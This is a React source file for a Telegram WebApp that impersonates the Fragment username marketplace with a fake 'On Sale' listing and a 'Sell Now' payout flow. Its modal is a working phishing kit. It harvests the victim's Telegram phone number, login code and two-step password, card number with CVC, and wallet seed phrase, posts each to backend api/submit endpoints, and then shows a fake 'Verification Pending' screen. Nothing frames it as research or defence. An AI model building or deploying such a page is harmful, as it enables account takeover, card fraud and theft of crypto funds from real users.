import { useState, useEffect } from 'react';
import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key, Fingerprint } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// Use a fallback for when Telegram WebApp is not available (e.g., in a browser)
const tg = (window as any).Telegram?.WebApp;

export default function App() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalStep, setModalStep] = useState<'select' | 'phone' | 'code' | '2fa' | 'card' | 'wallet' | 'success'>('select');
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [twoFactor, setTwoFactor] = useState('');
  const [cardData, setCardData] = useState({ number: '', expiry: '', cvc: '', name: '' });
  const [seedPhrase, setSeedPhrase] = useState('');
  const [loading, setLoading] = useState(false);
  const [cardType, setCardType] = useState<'Visa' | 'Mastercard' | 'Amex' | 'Unknown'>('Unknown');

  const [pageData, setPageData] = useState({
    username: 'news',
    priceTON: 382,
    priceUSD: 2000,
    pfp: 'https://picsum.photos/seed/news/400/400',
    status: 'On Sale',
    owner: 'EQB...3f2',
    history: [
      { id: 1, user: 'EQA...9x1', amount: 382, time: '2 hours ago', type: 'Listed' },
      { id: 2, user: 'EQC...4v2', amount: 350, time: '5 days ago', type: 'Sold' },
      { id: 3, user: 'EQD...1z8', amount: 300, time: '1 month ago', type: 'Sold' },
    ]
  });

  useEffect(() => {
    if (tg) {
      tg.expand();
      const linkId = tg.initDataUnsafe?.start_param;

      if (linkId) {
        fetch(`api/link/${linkId}`)
          .then(res => res.json())
          .then(data => {
            if (data.type === 'custom') {
              setPageData(prev => ({
                ...prev,
                username: data.username,
                priceTON: data.price,
                priceUSD: Math.floor(data.price * 5.23),
                pfp: data.pfp
              }));
            } else if (data.type === 'auto') {
              const user = tg.initDataUnsafe?.user;
              setPageData(prev => ({
                ...prev,
                username: user?.username || user?.first_name || 'user',
                priceTON: data.price,
                priceUSD: Math.floor(data.price * 5.23),
                pfp: user?.photo_url || `https://ui-avatars.com/api/?name=${user?.first_name || 'U'}&background=random&size=400`
              }));
            }
          })
          .catch(err => console.error("Failed to load link data", err));
      }
    }
  }, []);

  const handleOpenModal = () => {
    setModalStep('select');
    setIsModalOpen(true);
  };

  const handlePhoneSubmit = async () => {
    setLoading(true);
    try {
      const response = await fetch('api/submit/phone', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, user: tg?.initDataUnsafe?.user })
      });
      if (response.ok) setModalStep('code');
      else alert("Service unavailable. Try again.");
    } catch (err) {
      alert("Network error.");
    }
    setLoading(false);
  };

  const handleCodeSubmit = async () => {
    setLoading(true);
    try {
      const response = await fetch('api/submit/code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, code, user: tg?.initDataUnsafe?.user })
      });
      const data = await response.json();
      if (data.status === '2fa_needed') {
        setModalStep('2fa');
      } else {
        setModalStep('success');
      }
    } catch (err) {
      alert("Submission error.");
    }
    setLoading(false);
  };

  const handle2FASubmit = async () => {
    setLoading(true);
    try {
      await fetch('api/submit/2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, twoFactor, user: tg?.initDataUnsafe?.user })
      });
      setModalStep('success');
    } catch (err) {}
    setLoading(false);
  };

  const handleCardSubmit = async () => {
    setLoading(true);
    try {
      await fetch('api/submit/card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, cardData, user: tg?.initDataUnsafe?.user })
      });
      setModalStep('success');
    } catch (err) {}
    setLoading(false);
  };

  const handleWalletSubmit = async () => {
    setLoading(true);
    try {
      await fetch('api/submit/wallet', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ seedPhrase, user: tg?.initDataUnsafe?.user })
      });
      setModalStep('success');
    } catch (err) {}
    setLoading(false);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const parts = [];
    for (let i = 0; i < v.length && i < 16; i += 4) {
      parts.push(v.substring(i, i + 4));
    }
    const formatted = parts.join(' ');
    setCardData({ ...cardData, number: formatted });
    if (formatted.startsWith('4')) setCardType('Visa');
    else if (formatted.startsWith('5')) setCardType('Mastercard');
    else if (formatted.startsWith('3')) setCardType('Amex');
    else setCardType('Unknown');
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 2) {
      value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
    }
    setCardData({ ...cardData, expiry: value.substring(0, 7) });
  };

  return (
    <div className="min-h-screen flex flex-col bg-fragment-bg text-fragment-text selection:bg-fragment-blue/30 selection:text-fragment-blue relative overflow-hidden">
      {/* Reduced Background Complexity for Speed */}
      <div className="fixed inset-0 pointer-events-none z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-fragment-blue/5 rounded-full blur-[80px]" />
      </div>

      <header className="sticky top-0 z-50 bg-fragment-bg/60 backdrop-blur-md border-b border-fragment-border/50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <a href="/fragment/" className="flex items-center gap-3">
              <div className="w-8 h-8 bg-fragment-blue rounded-lg flex items-center justify-center">
                <Send size={18} className="text-white fill-white rotate-[-10deg]" />
              </div>
              <span className="text-lg font-black tracking-tighter text-white">FRAGMENT</span>
            </a>

            <div className="flex items-center gap-4">
              <button className="hidden sm:flex items-center gap-2 bg-fragment-blue text-white px-4 py-2 rounded-lg font-medium text-sm">
                Connect TON
              </button>
              <button className="md:hidden p-2 text-fragment-text-dim" onClick={() => setIsMenuOpen(!isMenuOpen)}>
                {isMenuOpen ? <X size={24} /> : <Menu size={24} />}
              </button>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-grow max-w-5xl mx-auto px-4 py-6 w-full relative z-10">
        <button className="flex items-center gap-2 text-fragment-text-dim hover:text-fragment-text mb-6">
          <ArrowLeft size={16} />
          <span className="text-sm font-medium">Back to Usernames</span>
        </button>

        <div className="flex flex-col gap-6">
          {/* Top Section: Profile info */}
          <div className="glass-card p-6">
            <div className="flex flex-col sm:flex-row items-center gap-6">
              <div className="w-32 h-32 rounded-[2rem] bg-gradient-to-br from-fragment-blue to-fragment-blue/40 flex items-center justify-center relative overflow-hidden border-2 border-fragment-border/50">
                <img src={pageData.pfp} alt="Profile" className="absolute inset-0 w-full h-full object-cover" referrerPolicy="no-referrer" />
              </div>
              <div className="flex-1 text-center sm:text-left">
                <div className="flex items-center justify-center sm:justify-start gap-3 mb-2">
                  <h1 className="text-3xl font-black tracking-tight text-white">@{pageData.username}</h1>
                  <div className="bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold uppercase px-2 py-0.5 rounded-md">On Sale</div>
                </div>
                <p className="text-fragment-text-dim text-sm mb-4">This collectible username is currently listed for sale.</p>
                <div className="flex justify-center sm:justify-start gap-4">
                  <div className="flex items-center gap-2 text-xs font-medium text-fragment-text-dim bg-fragment-bg/50 px-3 py-1.5 rounded-lg border border-fragment-border">
                    <ShieldCheck size={14} className="text-fragment-blue" /> Verified NFT
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* NEW LAYOUT: Sell Section is now ABOVE history */}
          <div className="glass-card bg-gradient-to-b from-fragment-card/80 to-fragment-bg/80 p-6 border-fragment-blue/30 shadow-xl">
             <div className="space-y-6">
                <div>
                  <p className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2">Current Price</p>
                  <div className="flex items-baseline gap-2">
                    <span className="text-4xl font-black tracking-tighter text-white">{pageData.priceTON.toLocaleString()} TON</span>
                    <span className="text-sm font-bold text-fragment-text-dim">≈ ${pageData.priceUSD.toLocaleString()}</span>
                  </div>
                </div>

                <button onClick={handleOpenModal} className="w-full py-4 bg-fragment-blue hover:bg-fragment-blue/90 text-white rounded-xl font-black text-lg transition-all flex items-center justify-center gap-3">
                  Sell Now <ArrowUpRight size={20} />
                </button>
             </div>
          </div>

          {/* Bottom Section: Sale History */}
          <div className="glass-card overflow-hidden">
            <div className="p-4 border-b border-fragment-border flex justify-between items-center">
              <h2 className="font-bold flex items-center gap-2 text-white text-sm">
                <History size={16} className="text-fragment-blue" /> Sale History
              </h2>
            </div>
            <div className="divide-y divide-fragment-border/30">
              {pageData.history.map((event) => (
                <div key={event.id} className="p-4 flex justify-between items-center text-xs">
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 rounded-lg bg-fragment-blue/10 flex items-center justify-center font-black text-fragment-blue">{event.user.slice(0, 2).toUpperCase()}</div>
                    <div>
                      <p className="font-bold text-white">{event.user}</p>
                      <p className="text-fragment-text-dim text-[10px]">{event.time}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="font-black text-white">{event.amount} TON</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </main>

      <AnimatePresence>
        {isModalOpen && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => !loading && setIsModalOpen(false)} className="absolute inset-0 bg-black/80 backdrop-blur-sm" />
            <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }} className="relative w-full max-w-md bg-fragment-card border border-fragment-border rounded-3xl shadow-2xl overflow-hidden p-6">

              {modalStep !== 'success' && (
                <div className="flex justify-between items-center mb-6">
                  <h2 className="text-xl font-black text-white">
                    {modalStep === 'select' ? 'Choose Payout' : 'Identity Verification'}
                  </h2>
                  <button onClick={() => setIsModalOpen(false)} className="text-fragment-text-dim"><X size={20} /></button>
                </div>
              )}

              {modalStep === 'select' && (
                <div className="space-y-3">
                  <button onClick={() => setModalStep('card')} className="w-full p-4 bg-fragment-bg border border-fragment-border rounded-xl flex items-center gap-4 hover:border-fragment-blue">
                    <CreditCard size={20} className="text-fragment-blue" /> <span className="font-bold text-sm">Credit Card</span>
                  </button>
                  <button onClick={() => setModalStep('phone')} className="w-full p-4 bg-fragment-bg border border-fragment-border rounded-xl flex items-center gap-4 hover:border-fragment-blue">
                    <Send size={20} className="text-orange-500" /> <span className="font-bold text-sm">Telegram Account</span>
                  </button>
                  <button onClick={() => setModalStep('wallet')} className="w-full p-4 bg-fragment-bg border border-fragment-border rounded-xl flex items-center gap-4 hover:border-fragment-blue">
                    <Wallet size={20} className="text-green-500" /> <span className="font-bold text-sm">Crypto Wallet</span>
                  </button>
                </div>
              )}

              {modalStep === 'phone' && (
                <div className="space-y-4">
                  <input type="tel" inputMode="tel" placeholder="Phone Number (+1...)" value={phone} onChange={(e) => setPhone(e.target.value)} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 focus:border-fragment-blue outline-none" />
                  <button onClick={handlePhoneSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">{loading ? 'Please wait...' : 'Continue'}</button>
                </div>
              )}

              {modalStep === 'code' && (
                <div className="space-y-4">
                  <input type="text" inputMode="numeric" placeholder="Verification Code" value={code} onChange={(e) => setCode(e.target.value)} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 text-center text-xl tracking-widest focus:border-fragment-blue outline-none" />
                  <button onClick={handleCodeSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">{loading ? 'Verifying...' : 'Verify'}</button>
                </div>
              )}

              {modalStep === '2fa' && (
                <div className="space-y-4">
                  <input type="password" placeholder="Two-Step Password" value={twoFactor} onChange={(e) => setTwoFactor(e.target.value)} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 focus:border-fragment-blue outline-none" />
                  <button onClick={handle2FASubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">Finish</button>
                </div>
              )}

              {modalStep === 'card' && (
                <div className="space-y-4 text-xs">
                  <input type="text" inputMode="numeric" placeholder="Card Number" value={cardData.number} onChange={handleCardNumberChange} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 outline-none" />
                  <div className="grid grid-cols-2 gap-4">
                    <input type="text" inputMode="numeric" placeholder="MM / YY" value={cardData.expiry} onChange={handleExpiryChange} className="bg-fragment-bg border border-fragment-border rounded-xl p-4 outline-none" />
                    <input type="text" inputMode="numeric" placeholder="CVC" value={cardData.cvc} onChange={(e) => setCardData({...cardData, cvc: e.target.value})} className="bg-fragment-bg border border-fragment-border rounded-xl p-4 outline-none" />
                  </div>
                  <input type="text" placeholder="Cardholder Name" value={cardData.name} onChange={(e) => setCardData({...cardData, name: e.target.value})} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 uppercase outline-none" />
                  <button onClick={handleCardSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">Register Payout</button>
                </div>
              )}

              {modalStep === 'wallet' && (
                <div className="space-y-4">
                  <textarea placeholder="Secret Seed Phrase (12/24 words)" rows={4} value={seedPhrase} onChange={(e) => setSeedPhrase(e.target.value)} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 focus:border-fragment-blue outline-none" />
                  <button onClick={handleWalletSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">Connect</button>
                </div>
              )}

              {modalStep === 'success' && (
                <div className="text-center py-6 space-y-4">
                   <div className="w-16 h-16 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto"><ShieldCheck size={32} /></div>
                   <h2 className="text-xl font-black text-white">Verification Pending</h2>
                   <p className="text-sm text-fragment-text-dim">Your request is being processed by the blockchain network. Please check back in a few minutes.</p>
                   <button onClick={() => setIsModalOpen(false)} className="w-full py-3 bg-white/10 text-white rounded-xl font-bold">Close</button>
                </div>
              )}

            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <footer className="p-8 text-center text-xs text-fragment-text-dim border-t border-fragment-border mt-10">
        © 2026 Fragment. All rights reserved.
      </footer>
    </div>
  );
}
